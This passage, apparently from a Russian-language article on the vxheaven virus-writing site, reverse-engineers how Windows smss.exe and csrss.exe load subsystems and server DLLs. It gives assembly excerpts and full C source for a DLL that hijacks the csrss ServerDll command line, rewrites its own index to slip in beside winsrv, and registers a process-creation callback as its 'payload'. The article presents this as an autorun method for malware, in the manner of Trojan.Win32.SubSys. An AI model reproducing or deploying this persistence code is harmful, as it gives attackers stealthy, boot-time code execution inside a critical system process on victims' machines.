+<p>Необходимо добавить параметр <strong>native</strong> в <strong>SubSystems</strong>, значением которого будет путь к <strong>native.exe</strong>. А также в параметр <strong>Required</strong> добавить строку <strong>native</strong>, после чего выполнить перезагрузку. Собственно это все способы автозагрузки, которые бросились мне в глаза во время исследования <strong>smss.exe</strong>. Также я заметил то, что одна из подсистем, которые загружаются, сsrss, имеет довольно интересный набор параметров, что натолкнуло меня на мысль, что там также есть возможность авторана.</p>
+<h2><a name="c7"></a>CSRSS и автозапуск</h2>
+<p>На самом деле csrss.exe – абсолютно неинтересная штуковина, самое полезное действие которой – вызов <strong>csrsrv!CsrServerInitialization</strong>. Если в <strong>smss</strong> все настройки содержались в реестре, то <strong>csrss</strong> берет настройки из командной строки, которая тоже указана в реестре и выглядит примерно так: <em>%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16</em> Парсинг этой строки производится в <strong>csrsrv!CsrParseServerCommandLine</strong>. Параметры, которые начинаются с “ServerDLL=”, содержат в себе информацию о подгружаемых библиотеках в виде x:y,z где х – имя библиотеки, у – имя процедуры инициализации, z – номер этой библиотеки. Загрузка этих библиотек происходит в <strong>csrsrv!CsrLoadServerDll</strong> следующим образом:</p>
+<ol>
+<li>Проверяется номер библиотеки
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>ModuleNum<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; short l_ok<br/>
+&nbsp;</div></li>
+<li>Проверяется не была ли библиотека с этим номером уже запущена
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">l_ok<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; _CsrLoadedServerDll<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short l_ok2<br/>
+&nbsp;</div></li>
+<li>Загружается библиотека средствами <strong>ntdll!LdrLoadDll</strong></li>
+<li>Инициализируется структура <strong>CSR_SERVER_DLL</strong></li>
+<li>Вызывается процедура инициализации, указанная для данной библиотеки. В качестве параметра функция получает указатель на инициализированную структуру <strong>CSR_SERVER_DLL</strong> для внесения дополнительной информации
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>var_20<span style="color: black;">&#93;</span><br/>
+&nbsp;</div></li>
+<li>Указатель на эту структуру сохраняется в массив <strong>CsrLoadedServerDll</strong>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span> &lt;<span style="color: #339933;">-</span> здесь содержится номер библиотеки после инициализации<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; _CsrLoadedServerDll<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp;</div></li>
+</ol>
+<p>Ошибка на любом из этапов – синий экран.</p>
+<p>В случае, если мы хотим использовать командную строку как возможность автозапуска очевидно, что необходимо присвоить своей библиотеке номер &lt; 4. <em>Trojan.Win32.SubSys</em>, дабы решить эту проблему, подменял запись одного из winsrv на свою. Я же предлагаю добавить свою запись. Часть строки инициализации, отвечающая за подгрузку библиотек, будет выглядеть следующим образом: <em>ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=native:MyServerDllInitialization,2 ServerDll=winsrv:ConServerDllInitialization,2</em></p>
+<p>Но тут возникает проблема с тем, что после библиотеки с номером 2 следует ещё одна библиотека с номером 2. То есть, для успешной загрузки второй библиотеки первая должна загрузиться так, чтобы в _CsrLoadedServerDll[2*4] остался 0. Возможность проделать это можно обнаружить внимательно посмотрев на процесс загрузки ещё раз. Номер библиотеки попадает в структуру <strong>CSR_SERVER_DLL</strong> во время её инициализации, но после этого указатель на структуру передается в процедуру инициализации, где можно подменить номер библиотеки, после чего на 6ом шаге указатель на структуру попадет по адресу <strong>CsrLoadedServerDll+4*новый_номер_библиотеки</strong>.</p>
+<p>Исходный код <strong>native.dll</strong>, которая реализует подобный механизм загрузки:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#pragma comment(linker,&quot;/ENTRY:DllEntry&quot;)</span><br/>
+<span style="color: #339933;">#pragma comment(linker, &quot;/SECTION:.text,EWR&quot;)</span><br/>
+<span style="color: #339933;">#pragma comment(linker, &quot;/SECTION:.rdata,EWR&quot;)</span><br/>
+<span style="color: #339933;">#define _X86_</span><br/>
+<span style="color: #339933;">#include &lt;ntddk.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;windef.h&gt;</span><br/>
+<span style="color: black; font-style: italic;">//</span><br/>
+<span style="color: black; font-style: italic;">//Структура, описывающая библиотеку</span><br/>
+<span style="color: black; font-style: italic;">//</span><br/>
+<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _CSR_SERVER_DLL <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG Length<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; HANDLE CsrInitializationEvent<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; STRING ModuleName<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; HANDLE ModuleHandle<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG ServerDllIndex<span style="color: #339933;">;</span><span style="color: black; font-style: italic;">// номер библиотеки</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG ServerDllConnectInfoLength<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG ApiNumberBase<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG MaxApiNumber<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">union</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ULONG ApiDispatchTable<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ULONG QuickApiDispatchTable<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; PBOOLEAN ApiServerValidTable<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; PSZ <span style="color: #339933;">*</span>ApiNameTable<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG PerProcessDataLength<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG PerThreadDataLength<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG ConnectRoutine<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG DisconnectRoutine<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG AddThreadRoutine<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG DeleteThreadRoutine<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG InitThreadRoutine<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG ExceptionRoutine<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG HardErrorRoutine<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; PVOID SharedStaticServerData<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG AddProcessRoutine<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG ShutdownProcessRoutine<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG ApiDispatchRoutine<span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span> CSR_SERVER_DLL<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PCSR_SERVER_DLL<span style="color: #339933;">;</span><br/>
+<span style="color: #993333;">typedef</span> BOOL <span style="color: black;">&#40;</span><span style="color: #339933;">*</span>PFNNOTIFYPROCESSCREATE<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>DWORD<span style="color: #339933;">,</span>DWORD<span style="color: #339933;">,</span>DWORD<span style="color: #339933;">,</span>DWORD<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: #993333;">typedef</span> BOOL <span style="color: black;">&#40;</span><span style="color: #339933;">*</span>PUSER_THREAD_START_ROUTINE<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>DWORD<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black; font-style: italic;">// небольшая полезная нагрузка</span><br/>
+<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #ff0000;">&quot;C&quot;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">void</span> BaseSetProcessCreateNotify<span style="color: black;">&#40;</span>IN PFNNOTIFYPROCESSCREATE ProcessCreateRoutine<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+BOOL ProcessCreateRoutine<span style="color: black;">&#40;</span>HANDLE UniqueProcess<span style="color: #339933;">,</span>HANDLE UniqueThread<span style="color: #339933;">,</span> DWORD shit<span style="color: #339933;">,</span> DWORD<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; dwFlags<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+PCSR_SERVER_DLL LoadedServerD<span style="color: #339933;">;</span><br/>
+<span style="color: black; font-style: italic;">//</span><br/>
+<span style="color: black; font-style: italic;">//Процедура инициализации, вызываемая после</span><br/>
+<span style="color: black; font-style: italic;">//заполнения вышеупомянутой структуры. Должна присутствовать в экспорте dll</span><br/>
+<span style="color: black; font-style: italic;">//</span><br/>
+NTSTATUS MyServerDllInitialization<span style="color: black;">&#40;</span>PCSR_SERVER_DLL LoadedServerDll<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//Сигнатурный поиск CsrLoadedServerDll</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; LoadedServerD<span style="color: #339933;">=</span>LoadedServerDll<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG<span style="color: #339933;">*</span> startaddr<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>ULONG<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>LoadedServerDll<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; startaddr<span style="color: #339933;">--;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span><span style="color: #339933;">*</span>search<span style="color: #339933;">=</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span>startaddr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//Ищем</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// mov _CsrLoadedServerDll[eax*4], esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #339933;">*</span>search<span style="color: #339933;">!=</span><span style="color: #208080;">0x89</span><span style="color: black;">&#41;</span><span style="color: #339933;">||</span><span style="color: black;">&#40;</span><span style="color: #339933;">*</span><span style="color: black;">&#40;</span>search<span style="color: #339933;">+</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">!=</span><span style="color: #208080;">0x34</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> search<span style="color: #339933;">++;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ULONG CsrLoadedServerDll<span style="color: #339933;">=*</span><span style="color: black;">&#40;</span>ULONG<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>search<span style="color: #339933;">+</span><span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//подсчитываем новый номер так, чтобы</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//mov _CsrLoadedServerDll[eax*4], esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//записало LoadedServerDll не в _CsrLoadedServerDll[2*4]</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//а в поле LoadedServerDll-&gt;CsrInitializationEvent,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//которое выбрано случайно.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; LoadedServerDll<span style="color: #339933;">-&gt;</span>ServerDllIndex<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>ULONG<span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>LoadedServerDll<span style="color: #339933;">-&gt;</span>CsrInitializationEvent<span style="color: #339933;">/</span><span style="color: #0000dd;">4</span><span style="color: #339933;">-</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; CsrLoadedServerDll<span style="color: #339933;">/</span><span style="color: #0000dd;">4</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//На всякий случай</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; LoadedServerDll<span style="color: #339933;">-&gt;</span>PerProcessDataLength <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; LoadedServerDll<span style="color: #339933;">-&gt;</span>PerThreadDataLength <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//Полезная нагрузка</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; BaseSetProcessCreateNotify<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>PFNNOTIFYPROCESSCREATE<span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>ProcessCreateRoutine<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<span style="color: #993333;">int</span> APIENTRY DllEntry<span style="color: black;">&#40;</span>HINSTANCE h_module<span style="color: #339933;">,</span> DWORD dw_reason<span style="color: #339933;">,</span> LPVOID p_reserved<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; DbgPrint<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;We're in<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+BOOL ProcessCreateRoutine<span style="color: black;">&#40;</span>HANDLE UniqueProcess<span style="color: #339933;">,</span>HANDLE UniqueThread<span style="color: #339933;">,</span> DWORD shit<span style="color: #339933;">,</span> DWORD<br/>
+dwFlags<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; DbgPrint<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;New Process created PID=%08X TID=%08X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>UniqueProcess<span style="color: #339933;">,</span>UniqueThread<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #000000; font-weight: bold;">true</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Пара слов о полезной нагрузке.</p>
+<p><strong>basesrv.dll</strong>, которая также подгружается в пространство процесса csrss, экспортирует функцию <strong>BaseSetProcessCreateNotify</strong>, которая инициализирует глобальную переменную <strong>basesrv!UserNotifyProcessCreate</strong> переданным в данную функцию значением. При создании пользовательского процесса происходит нотификация <strong>basesrv</strong>, которая после завершения инициализации вызывает функцию, указатель на которую находится в <strong>basesrv!UserNotifyProcessCreate</strong>. Более глубоко в эту сторону копнул <strong>blast</strong> http://virustech.org/f/viewtopic.php?id=25</p>
+<p>На этом заканчиваю свой обзор.</p>
+<p>Cпасибо коллективу cih.[ms] за моральную поддержку во время исследования.</p>
+[<a style="" href="/lib/?lang=RU&amp;index=WI#vfr00">Вернуться к списку</a>] [<a href="/lib/vfr00.html#disqus_thread">Комментарии</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vfr00">de</a><a href="/lib/index.php?lang=en&amp;id=vfr00">en</a><a href="/lib/index.php?lang=es&amp;id=vfr00">es</a><a href="/lib/index.php?lang=it&amp;id=vfr00">it</a><a href="/lib/index.php?lang=fr&amp;id=vfr00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vfr00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vfr00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vfr00">ua</a></div>
+</body>
+</html>
